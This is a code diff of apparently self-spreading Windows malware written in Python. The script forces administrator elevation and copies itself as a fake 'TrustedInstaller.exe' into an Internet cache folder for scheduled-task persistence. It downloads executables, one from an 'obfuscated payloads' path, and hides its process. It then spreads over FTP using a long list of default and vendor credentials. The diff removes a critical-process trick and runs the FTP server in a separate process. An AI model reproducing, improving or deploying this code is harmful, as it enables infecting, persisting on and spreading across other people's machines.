@@ -10,6 +10,7 @@ import urllib3
 import ftplib
 import ctypes
 import getpass
+import multiprocessing
 from concurrent.futures import ThreadPoolExecutor
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -18,10 +19,6 @@ common_users = ['test','anonymous','abc123','nic2212','PlcmSpIp','accounting','1
 ]
 common_pass = ['','123456','USER','admin','Janitza','eqidemo','spam','anonymous','supervisor','factorycast@schneider','user00','password','12hrs37','aaaa','AAAA','123456789','1111','beijer','maygion.com','webadmin','b1uRR3','test2','webmaster','eMerge','pass1','test','test123','nobody','test1','root','news','info','ftp','ntpupdate','webpages','sresurdf','uploader','pcfactory','ZYPCOM','apc','admin12345','mysql','system','none','1111','ftp_boot','MELSEC','guest','nas','hexakisoctahedron','techsupport','localadmin','default','wsupgrade','stingray','dpstelecom','fwdownload','abc123','web','testingpw','ko2003wa','oracle','cvsadm','1234','testing','test4','wago','test3','tester','12345','avery','instrument','user','testuser','fhttpadmin','QNUDECPU','9999','rootpasswd','PlcmSpIp','poiuypoiuy','sysadm'
 ]
-
-RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
-RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
-RtlSetProcessIsCritical.restype = ctypes.c_int
 
 GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
 SECOND_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/pwndrive.exe"
@@ -34,17 +31,6 @@ def request_admin():
     if not is_admin():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
         sys.exit(0)
-
-def set_process_as_critical():
-    try:
-        result = RtlSetProcessIsCritical(1, 0, 0)
-
-        if result == 0: print("Process is now critical.")
-        else: print("Failed to set the process as critical.")
-    
-    except:
-        # print(f"Error: {e}")
-        pass
 
 def generate_random_name(length=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -133,7 +119,9 @@ def hide_process():
 def persist_schtasks():
     try:
         exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-        appdata_path = os.path.join(os.getenv('APPDATA'), 'TrustedInstaller.exe') # this will be the PE file name
+        appdata_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Windows\INetCache\Content.MSO\TrustedInstaller.exe') # this will be the PE file name
+        if not os.path.exists(os.path.dirname(appdata_path)):
+            os.makedirs(os.path.dirname(appdata_path))
         if exe_path != appdata_path:
             shutil.copy2(exe_path, appdata_path)
         exe_path = f'"{os.path.normpath(appdata_path)}"'
@@ -335,10 +323,10 @@ def setup_ftp_server(usernames, passwords):
 
 if __name__ == "__main__":
     request_admin()
-    set_process_as_critical()
     persist_schtasks()
     download_payload()
-    setup_ftp_server(common_users, common_pass)
+    setup_process = multiprocessing.Process(target=setup_ftp_server, args=(common_users, common_pass))
+    setup_process.start()
     # make_open()
     hide_process()
     ftp_spread(common_users, common_pass)
